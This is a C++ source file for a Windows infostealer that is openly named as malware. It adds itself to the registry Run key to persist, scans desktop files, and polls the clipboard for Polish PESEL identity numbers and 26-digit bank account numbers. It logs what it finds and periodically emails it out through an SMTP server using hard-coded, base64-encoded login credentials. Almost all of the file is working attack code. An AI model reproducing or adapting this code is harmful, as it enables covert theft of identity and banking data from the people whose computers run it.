//C++ Headers

#include <winsock2.h> //Socket Header
#include <windows.h>  //Win API Header
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

//C Header
#include <stdio.h> //Input Output Header
#include <fstream>
#include <shlobj.h>

//Debug C++ Header
#include <iostream> //Input Output Debug Header
#include <filesystem>
#include <string>

void checkPesel(const char *probablePesel);

void checkAccount(const char *probableAccount);

void scanDesktop(const char *path);

void persistMalware();

void sendData();

int countDigits(const char *cbTextPreprocess);

int main()
{
    //Hiding console windows
    HWND windowHandle;
    AllocConsole();
    windowHandle = FindWindowA("ConsoleWindowClass", NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(windowHandle, SW_SHOWNORMAL);                //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console

    //TODO: Uncoment values
    persistMalware();

    //Scan desktop in search for data
    scanDesktop("");

    //Send data over email.
    sendData();
    int i = 0;
    //Clipboard monitoring loop
    while (true)
    {
        while (!OpenClipboard(nullptr))
        {
            //Could not open clipboard
            // std::cout << "Could not open clopboard" << std::endl;
        }
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData == nullptr)
        {
            // std::cout << "Couldn't retrive data from clipboard" << std::endl;
        }
        char *clpbrdText = static_cast<char *>(GlobalLock(hData));
        if (clpbrdText == nullptr)
        {
            // std::cout << "Couldn't change data to char" << std::endl;
            GlobalUnlock(hData);
            CloseClipboard();
        }
        else
        {
            GlobalUnlock(hData);
            CloseClipboard();
            int len = countDigits(clpbrdText);
            if (len >= 11)
            {
                //std::cout << "Possible PESEL" << std::endl;
                checkPesel(clpbrdText);
            }
            if (len >= 26)
            {
                checkAccount(clpbrdText);
                // std::cout << "Possible Account number" << std::endl;
            }
        }
        i++;
        if (i == 144000)
        {
            sendData();
            i = 0;
        }
        Sleep(200);
    }

    return 0;
}

int countDigits(const char *cbTextPreprocess)
{
    int out = 0;

    for (int i = 0; cbTextPreprocess[i] != 0; i++)
    {
        if (isdigit(cbTextPreprocess[i]))
        {
            ++out;
        }
    }
    return out;
}

void scanDesktop(const char *pathPassed)
{
    char path[MAX_PATH]; // must be _MAX_PATH in size

    if (strlen(pathPassed) > 0)
    {
        strcpy(path, pathPassed);
    }
    else
    {
        HRESULT resultDesktop = SHGetFolderPath(NULL, // no parent window
                                                CSIDL_DESKTOP,
                                                0,    // no flags
                                                NULL, // no tokens
                                                path);
    }

    int len = strlen(path);
    path[len] = '\\';
    path[len + 1] = '*';
    path[len + 2] = '\0';
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFile(path, &data);
    do
    {
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (strcmp(".", (char *)data.cFileName) != 0 && strcmp("..", (char *)data.cFileName) != 0)
            {
                char nextPath[MAX_PATH];
                strcpy(nextPath, path);
                nextPath[strlen(nextPath) - 1] = '\0';
                strcat(nextPath, (char *)data.cFileName);
                scanDesktop(nextPath);
            }
        }
        else
        {
            char filePath[MAX_PATH];
            strcpy(filePath, path);
            filePath[strlen(filePath) - 1] = '\0';
            strcat(filePath, (char *)data.cFileName);
            std::ifstream myfile;
            std::string line;
            myfile.open(filePath);
            while (std::getline(myfile, line))
            {
                int len = countDigits(line.c_str());
                if (len >= 11)
                {
                    checkPesel(line.c_str());
                }
                if (len >= 26)
                {
                    checkAccount(line.c_str());
                }
            }
            myfile.close();
        }

    } while (FindNextFile(hFind, &data));
    // std::cout << "Closing find" << std::endl;
    FindClose(hFind);
}

void sendData()
{
    std::cout << "Sending mail" << std::endl;
    const char *serv = "poczta.interia.pl";
    const char *from = "MAIL FROM: <ttestmal.smtp@interia.pl>\r\n";
    const char *to = "RCPT TO: <ttestmal.smtp@interia.pl>\r\n";
    const char *heloCmd = "HELO poczta.interia.pl\r\n";
    const char *authCmd = "AUTH LOGIN\r\n";
    const char *startCmd = "DATA\r\n";
    const char *quitCmd = "QUIT\r\n";
    const char *msg = "To: ttestmal.smtp@interia.pl\r\nFrom: ttestmal.smtp@interia.pl\r\nSubject: report\r\nMIME-Version: 1.0\r\nContent-type: text/plain; charset=US-ASCII\r\n\r\n";
    char msgCont[40000] = "Pesels:\r\n";
    const char *log = "dHRlc3RtYWwuc210cA==\r\n";
    const char *pas = "VFRUM3N0ZWQ=\r\n";
    short nProtocolPort = 587;
    SOCKADDR_IN sockAddr;

    WSADATA wsaData;
    int iResult;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

    if (iResult != 0)
    {
        std::cout << "WSAStartup failed: " << iResult << std::endl;
        return;
    }

    LPHOSTENT lpHostEnt = gethostbyname(serv);
    if (lpHostEnt == NULL)
    {
        std::cout << "Host not lookedup" << std::endl;
    }
    std::cout << "Host lookedup" << std::endl;

    std::cout << inet_ntoa(*((struct in_addr *)
                                 lpHostEnt->h_addr_list[0]))
              << std::endl;

    SOCKET hServerSocket = INVALID_SOCKET;
    hServerSocket = socket(PF_INET, SOCK_STREAM, 0);

    if (hServerSocket == INVALID_SOCKET)
    {
        std::cout << "Socket failed" << std::endl;
        return;
    }
    std::cout << "Socket created" << std::endl;

    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(nProtocolPort);
    sockAddr.sin_addr = *((struct in_addr *)lpHostEnt->h_addr_list[0]);

    int nConnect = connect(hServerSocket, (PSOCKADDR)&sockAddr, sizeof(sockAddr));

    if (nConnect)
    {
        hServerSocket = INVALID_SOCKET;
        std::cout << "Failed connect" << std::endl;
        std::cout << WSAGetLastError() << std::endl;
        return;
    }
    std::cout << "Connected" << std::endl;

    BYTE sReceiveBuffer[4096];
    int iLength = 0;
    int iEnd = 0;
    char buf[4096];
    int s = 0;
    char *msgHeader = new char[16385];

    send(hServerSocket, heloCmd, strlen(heloCmd), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    send(hServerSocket, authCmd, strlen(authCmd), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    send(hServerSocket, log, strlen(log), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    send(hServerSocket, pas, strlen(pas), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    send(hServerSocket, from, strlen(from), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    send(hServerSocket, to, strlen(to), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    send(hServerSocket, startCmd, strlen(startCmd), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    send(hServerSocket, msg, strlen(msg), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    std::string line;
    std::ifstream myfile1;
    // std::cout << "Opening" << std::endl;
    myfile1.open("pesel.txt");
    if (myfile1.is_open())
    {
        // std::cout << "Opened" << std::endl;
        while (std::getline(myfile1, line))
        {
            // std::cout << "Adding line" << std::endl;
            strcat(msgCont, line.c_str());
            strcat(msgCont, "\r\n");
        }
    }
    myfile1.close();
    strcat(msgCont, "accounts:\r\n");
    std::ifstream myfile2;
    // std::cout << "Opening" << std::endl;
    myfile2.open("account.txt");
    if (myfile2.is_open())
    {
        // std::cout << "Opened" << std::endl;
        while (std::getline(myfile2, line))
        {
            // std::cout << "Adding line" << std::endl;
            strcat(msgCont, line.c_str());
            strcat(msgCont, "\r\n");
        }
    }
    myfile2.close();
    strcat(msgCont, "\r\n.\r\n");
    send(hServerSocket, msgCont, strlen(msgCont), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    send(hServerSocket, quitCmd, strlen(quitCmd), 0);
    iLength = recv(hServerSocket, (LPSTR)sReceiveBuffer + iEnd, sizeof(sReceiveBuffer) - iEnd, 0);
    iEnd += iLength;
    sReceiveBuffer[iEnd] = '\0';
    std::cout << sReceiveBuffer;
}

void checkPesel(const char *probablePesel)
{

    char pesel[12];

    int weights[10] = {9, 7, 3, 1, 9, 7, 3, 1, 9, 7};

    int count = 0;

    while (*probablePesel != 0)
    {
        if (isdigit(*probablePesel))
        {
            pesel[count] = *probablePesel;
            ++count;
            if (count == 11)
            {

                pesel[11] = '\0';
                int sum = 0;
                if(pesel[2] > '1' || pesel[4] > '3'){
                    return;
                }
                for (int i = 0; i < 10; i++)
                {

                    sum += (pesel[i] - '0') * weights[i];
                }
                if (sum % 10 == pesel[10] - '0')
                {

                    std::ifstream myfile;
                    myfile.open("pesel.txt");
                    std::string line;
                    bool notPresent = true;
                    if (myfile.is_open())
                    {
                        while (std::getline(myfile, line))
                        {
                            if (strcmp(line.c_str(), pesel) == 0)
                            {
                                //std::cout << "Already present. Not adding" << std::endl;
                                notPresent = false;
                                break;
                            }
                        }
                        myfile.close();
                    }
                    if (notPresent)
                    {
                        std::ofstream myfileAppend;
                        myfileAppend.open("pesel.txt", std::ios::app);
                        myfileAppend << '\n';
                        myfileAppend << pesel;
                        myfileAppend.close();
                    }
                }
                count = 0;
            }
        }
        else
        {
            count = 0;
        }
        probablePesel++;
    }
}

void checkAccount(const char *probableAccount)
{

    char account[27];

    int count = 0;

    while (*probableAccount != 0)
    {
        if (isdigit(*probableAccount))
        {
            account[count] = *probableAccount;
            count++;
            if (count == 26)
            {
                account[26] = '\0';
                // std::cout << "Found probable account" << std::endl;
                // std::cout << account << std::endl;
                std::ifstream myfile;
                myfile.open("account.txt");
                std::string line;
                bool notPresent = true;
                if (myfile.is_open())
                {
                    while (std::getline(myfile, line))
                    {
                        if (strcmp(line.c_str(), account) == 0)
                        {
                            //std::cout << "Already present. Not adding" << std::endl;
                            notPresent = false;
                            break;
                        }
                    }
                }
                myfile.close();
                if (notPresent)
                {
                    std::ofstream myfileAppend("account.txt", std::ios::app);
                    myfileAppend << std::endl;
                    myfileAppend << account;
                    myfileAppend.close();
                }
                count = 0;
            }
        }
        else
        {
            if (count == 2 || count == 6 || count == 10 || count == 14 || count == 18 || count == 22)
            {
                /* code */
            }
            else
            {
                count = 0;
            }
        }
        probableAccount++;
    }
}

void persistMalware()
{

    HKEY key;
    TCHAR NPath[MAX_PATH];
    GetModuleFileName(NULL, NPath, MAX_PATH);

    std::cout << NPath << std::endl;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
    {
        std::cout << "Opened registry" << std::endl;
        if (RegSetValueExA(key, "Mal", 0, REG_SZ, (LPBYTE)NPath, sizeof(NPath)) == ERROR_SUCCESS)
        {
            std::cout << "Key changed in registry" << std::endl;
        }
        else
        {
            std::cout << "Key not changed in registry" << std::endl;
            // printf("Error %u ", (unsigned int)GetLastError());
        }

        RegCloseKey(key);
    }
}